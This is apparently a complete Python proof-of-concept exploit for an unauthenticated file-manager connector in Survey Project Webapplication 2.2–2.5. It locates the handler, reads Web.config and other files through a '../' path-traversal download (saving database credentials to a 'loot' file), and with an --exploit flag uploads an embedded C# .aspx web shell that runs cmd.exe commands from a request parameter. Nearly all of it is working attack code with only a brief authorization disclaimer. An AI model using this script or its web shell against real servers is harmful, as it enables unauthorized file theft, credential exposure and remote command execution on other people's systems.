#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Proof of concept for the unauthenticated Filemanager ASP.NET connector in
Survey™ Project Webapplication.

Affected releases (verified from the official packages):
  2.2 Alpha, 2.2 Final      handler at /Filemanager/connectors/ashx/filemanager.ashx
  2.3, 2.4, 2.4-DOI, 2.4-wpi, 2.5
                            handler at /Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx

The handler takes the mode, path, currentpath, old, new and name parameters from
the request and performs no authentication or authorization check. This script:

  * detects the connector and its location,
  * lists the application root and reads Web.config through mode=download,
  * with --exploit, uploads an .aspx command shell through mode=add and runs a
    command through it, then removes the shell again.

Only use this against systems you own or are explicitly authorized to test.

Examples:
  python3 poc_surveyproject_filemanager.py -u http://target
  python3 poc_surveyproject_filemanager.py -u http://target --exploit --cmd whoami
  python3 poc_surveyproject_filemanager.py -u http://target/app --exploit
  python3 poc_surveyproject_filemanager.py -u https://target --insecure --no-read
"""

import argparse
import html
import random
import re
import ssl
import string
import sys
import urllib.error
import urllib.parse
import urllib.request

HANDLERS = (
    "/Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx",  # 2.3 - 2.5
    "/Filemanager/connectors/ashx/filemanager.ashx",                  # 2.2
)

UPLOAD_DIRS = ("/Scripts", "/Images", "/Content", "/fonts", "/")

SHELL = r'''<%@ Page Language="C#" %>
<script runat="server">
void Page_Load() {
    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]);
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.UseShellExecute = false;
    var p = System.Diagnostics.Process.Start(psi);
    Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()) + "</pre>");
    p.WaitForExit();
}
</script>
'''

USER_AGENT = "surveyproject-filemanager-poc/1.0"


def log(msg):
    print(msg, flush=True)


def vlog(enabled, msg):
    if enabled:
        print("[*] " + msg, flush=True)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Return 3xx responses to the caller instead of following them."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class Client(object):
    def __init__(self, timeout, proxy, insecure, verbose):
        handlers = [urllib.request.HTTPHandler(), NoRedirect()]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        context = ssl._create_unverified_context() if insecure else ssl.create_default_context()
        handlers.append(urllib.request.HTTPSHandler(context=context))
        self.opener = urllib.request.build_opener(*handlers)
        self.timeout = timeout
        self.verbose = verbose

    def request(self, url, data=None, headers=None):
        hdrs = {"User-Agent": USER_AGENT, "Accept": "*/*"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, data=data, headers=hdrs)
        try:
            with self.opener.open(req, timeout=self.timeout) as resp:
                return resp.status, dict(resp.headers), resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, dict(exc.headers or {}), exc.read()
        except Exception as exc:  # URLError, timeout, TLS errors
            return 0, {}, str(exc).encode("utf-8", "replace")

    def get(self, url):
        if self.verbose:
            vlog(True, "GET " + url)
        return self.request(url)

    def post(self, url, body, headers):
        if self.verbose:
            vlog(True, "POST " + url)
        return self.request(url, data=body, headers=headers)


def join(base, path):
    return base.rstrip("/") + path


def find_handler(client, base, explicit, verbose):
    candidates = (explicit,) if explicit else HANDLERS
    for handler in candidates:
        probe = "%s?mode=getfolder&path=%%2F" % join(base, handler)
        status, _headers, body = client.get(probe)
        text = body.decode("utf-8", "replace")
        vlog(verbose, "probe %s -> HTTP %s (%d bytes)" % (handler, status, len(body)))
        if status == 200 and '"File Type": "dir"' in text:
            return handler, text
    return None, None


def read_relative(client, base, handler, relative, depth, require_xml):
    payload = "../" * depth + relative
    url = "%s?mode=download&path=%s" % (
        join(base, handler),
        urllib.parse.quote(payload, safe="/"),
    )
    status, _headers, body = client.get(url)
    if status != 200 or not body:
        return None
    if require_xml and not (body.lstrip().startswith(b"<?xml") or b"<configuration" in body[:8192]):
        return None
    return body


def discover_depth(client, base, handler, verbose):
    for depth in range(1, 9):
        body = read_relative(client, base, handler, "Web.config", depth, True)
        vlog(verbose, "Web.config at depth %d: %s" % (depth, "ok" if body else "no"))
        if body:
            return depth, body
    return None, None


def multipart(field, filename, content, boundary):
    parts = [
        ("--%s\r\n" % boundary).encode(),
        ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (field, filename)).encode(),
        b"Content-Type: application/octet-stream\r\n\r\n",
        content,
        ("\r\n--%s--\r\n" % boundary).encode(),
    ]
    return b"".join(parts)


def upload_shell(client, base, handler, directory, name):
    boundary = "----surveyproject" + "".join(random.choice(string.hexdigits.lower()) for _ in range(16))
    body = multipart("file", name, SHELL.encode("utf-8"), boundary)
    url = "%s?mode=add&currentpath=%s" % (
        join(base, handler),
        urllib.parse.quote(directory, safe=""),
    )
    status, _headers, resp = client.post(
        url, body, {"Content-Type": "multipart/form-data; boundary=%s" % boundary}
    )
    text = resp.decode("utf-8", "replace")
    # The add branch renders the JSON through a multi-line TextBox, so the
    # response body is HTML-encoded inside a <textarea>.
    decoded = html.unescape(text)
    ok = status == 200 and '"Code": 0' in decoded and '"Error": "No error"' in decoded
    return ok, status, text


def run_command(client, base, shell_path, command):
    url = "%s?cmd=%s" % (join(base, shell_path), urllib.parse.quote(command, safe=""))
    status, _headers, body = client.get(url)
    text = body.decode("utf-8", "replace")
    match = re.search(r"<pre>(.*?)</pre>", text, re.S | re.I)
    if status == 200 and match:
        return html.unescape(match.group(1)).strip(), status
    return None, status


def delete_path(client, base, handler, path):
    url = "%s?mode=delete&path=%s" % (
        join(base, handler),
        urllib.parse.quote(path, safe="/"),
    )
    status, _headers, body = client.get(url)
    text = body.decode("utf-8", "replace")
    return status == 200 and '"Code": 0' in text, status, text


def shell_path_for(directory, name):
    if directory == "/":
        return "/" + name
    return directory.rstrip("/") + "/" + name


def main():
    parser = argparse.ArgumentParser(
        description="Survey™ Project Webapplication Filemanager ASP.NET connector PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("-u", "--url", required=True,
                        help="base URL, e.g. http://target or http://target/app")
    parser.add_argument("--handler", help="explicit handler path (default: auto-detect)")
    parser.add_argument("--exploit", action="store_true",
                        help="upload an .aspx shell and execute a command (default: read-only checks)")
    parser.add_argument("--cmd", default="whoami",
                        help="command for --exploit (default: whoami)")
    parser.add_argument("--dir", action="append", dest="dirs", metavar="DIR",
                        help="upload directory candidate, repeatable (default: %s)"
                             % ", ".join(UPLOAD_DIRS))
    parser.add_argument("--read", metavar="FILE",
                        help="also read FILE relative to the application root")
    parser.add_argument("--no-read", action="store_true", help="skip the Web.config read check")
    parser.add_argument("--keep", action="store_true", help="keep the uploaded shell")
    parser.add_argument("--out", default="Web.config.loot",
                        help="file to save the downloaded Web.config (default: Web.config.loot)")
    parser.add_argument("--depth", type=int,
                        help="number of ../ levels to the application root (default: auto)")
    parser.add_argument("--timeout", type=float, default=10.0, help="request timeout in seconds")
    parser.add_argument("--proxy", help="HTTP(S) proxy URL")
    parser.add_argument("--insecure", action="store_true", help="do not verify TLS certificates")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbose output")
    parser.add_argument("--yes", action="store_true",
                        help="skip the interactive confirmation for --exploit")
    args = parser.parse_args()

    base = args.url.rstrip("/")
    client = Client(args.timeout, args.proxy, args.insecure, args.verbose)

    log("[*] target:  " + base)
    handler, listing = find_handler(client, base, args.handler, args.verbose)
    if not handler:
        log("[-] Filemanager handler not found, or it did not answer as expected.")
        log("[-] The target does not appear vulnerable at the tested paths.")
        return 2

    dirs = tuple(args.dirs) if args.dirs else UPLOAD_DIRS
    entries = listing.count('"File Type": "dir"')
    log("[+] handler: %s" % handler)
    log("[+] mode=getfolder works unauthenticated (%d directory entries visible)" % entries)

    depth = args.depth
    config_body = None
    if not args.no_read or args.read:
        if depth is None:
            depth, config_body = discover_depth(client, base, handler, args.verbose)
        elif not args.no_read:
            config_body = read_relative(client, base, handler, "Web.config", depth, True)

        if not args.no_read:
            if config_body:
                with open(args.out, "wb") as fh:
                    fh.write(config_body)
                log("[+] mode=download works: Web.config is %d bytes (depth %d), saved to %s"
                    % (len(config_body), depth, args.out))
                log("[!] Web.config can contain database credentials; handle the file accordingly.")
            else:
                log("[-] Web.config could not be read (wrong path, permissions, or patch).")

        if args.read and depth:
            body = read_relative(client, base, handler, args.read, depth, False)
            if body:
                target = args.read.replace("/", "_")
                with open(target, "wb") as fh:
                    fh.write(body)
                log("[+] read %s (%d bytes) to %s" % (args.read, len(body), target))
            else:
                log("[-] could not read %s" % args.read)

    if not args.exploit:
        log("[*] read-only checks done. Use --exploit to upload a shell.")
        return 0

    log("[!] --exploit is enabled: uploading an .aspx command shell.")
    if not args.yes and sys.stdin.isatty():
        answer = input("[?] Continue? [y/N] ").strip().lower()
        if answer not in ("y", "yes"):
            log("[-] aborted")
            return 1

    name = "poc_" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8)) + ".aspx"
    marker = "poc" + "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    uploaded = []
    shell_url = None

    for directory in dirs:
        ok, status, text = upload_shell(client, base, handler, directory, name)
        if not ok:
            vlog(args.verbose, "upload to %s failed (HTTP %s)" % (directory, status))
            continue
        path = shell_path_for(directory, name)
        uploaded.append(path)
        output, code = run_command(client, base, path, "echo " + marker)
        if output is not None and marker in output:
            shell_url = join(base, path)
            log("[+] mode=add works: %s is writable, shell at %s" % (directory, shell_url))
            break
        vlog(args.verbose, "shell in %s accepted but not executable (HTTP %s)" % (directory, code))

    if not shell_url:
        if uploaded:
            log("[-] upload succeeded but no uploaded shell was executable.")
        else:
            log("[-] upload failed in all candidate directories (permissions, patched handler, or wrong paths).")
        log("[-] On 2.5 the web root is denied to anonymous users; use --dir /Scripts.")
        for path in uploaded:
            delete_path(client, base, handler, path)
        return 2

    output, _code = run_command(client, base, shell_url[len(base):], args.cmd)
    log("[+] command: %s" % args.cmd)
    if output is None:
        log("[-] command did not return output")
    else:
        for line in output.splitlines() or [""]:
            log("    " + line)

    if args.keep:
        log("[*] shell kept at %s (--keep)" % shell_url)
    else:
        for path in uploaded:
            ok, status, _text = delete_path(client, base, handler, path)
            if ok:
                check, _h, _b = client.get(join(base, path))
                extra = " (verified: HTTP %s)" % check if check in (302, 404) else ""
                log("[+] removed %s with mode=delete%s" % (path, extra))
            else:
                log("[-] cleanup of %s failed (HTTP %s)" % (path, status))

    return 0


if __name__ == "__main__":
    sys.exit(main())
